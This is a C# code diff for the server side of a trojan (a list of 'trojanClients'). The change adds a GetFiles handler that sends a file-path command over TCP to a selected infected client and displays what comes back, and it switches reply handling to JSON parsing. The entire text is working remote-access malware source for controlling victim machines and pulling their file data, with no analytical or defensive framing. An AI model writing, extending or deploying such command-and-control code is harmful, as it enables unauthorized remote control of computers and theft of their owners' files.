@@ -29,6 +29,7 @@ namespace Server.TCP
             serverGUI = new Window1();
             serverGUI.Show();
             serverGUI.SentPressed += SendMessage;
+            serverGUI.GetFiles += GetFiles;
 
             BackgroundWorker worker1 = new BackgroundWorker();
             worker1.DoWork += new DoWorkEventHandler(Worker1_DoWork);
@@ -80,7 +81,6 @@ namespace Server.TCP
                 }
             }
         }
-        
 
         async void SendMessage(object sender, EventArgs e)
         {
@@ -112,7 +112,8 @@ namespace Server.TCP
                         i = await stream.ReadAsync(bytes, 0, bytes.Length);
                     }
                     var response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                    serverGUI.DisplayOutput(response);
+                    Response responseObj = JsonConvert.DeserializeObject<Response>(response);
+                    serverGUI.DisplayOutput(responseObj.response);
                 }
                 catch
                 {
@@ -137,6 +138,50 @@ namespace Server.TCP
             var trojanClient = trojanClients.Where(x => x.Client == client).FirstOrDefault();
             if (trojanClient != null)
                 RemoveClient(trojanClient);
+        }
+
+        private async void GetFiles(object sender, EventArgs e)
+        {
+            int clientId = serverGUI.GetClientId();
+            int commandId = serverGUI.GetCommandId();
+            if (clientId >= 0 && commandId >= 0)
+            {
+                var trojanClient = trojanClients[serverGUI.GetClientId()];
+                var client = trojanClient.Client;
+                var bytes = new Byte[256];
+
+                // Get a stream object for reading and writing
+
+                NetworkStream stream = client.GetStream();
+                byte[] msg = null;
+                Command command = new Command(0, serverGUI.GetFile());
+                string output = JsonConvert.SerializeObject(command);
+                msg = System.Text.Encoding.ASCII.GetBytes(output);
+                try
+                {
+
+                    if (stream.CanWrite)
+                    {
+                        await stream.WriteAsync(msg, 0, msg.Length);
+                    }
+                    int i = 0;
+                    if (stream.CanRead)
+                    {
+                        i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                    }
+                    var response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                    serverGUI.UpdateList(response);
+                }
+                catch
+                {
+                    serverGUI.DisplayOutput("Client does not respond.");
+                    RemoveClient(trojanClient);
+                }
+            }
+            else
+            {
+                serverGUI.DisplayOutput("Select a client and a command.");
+            }
         }
     }
 }
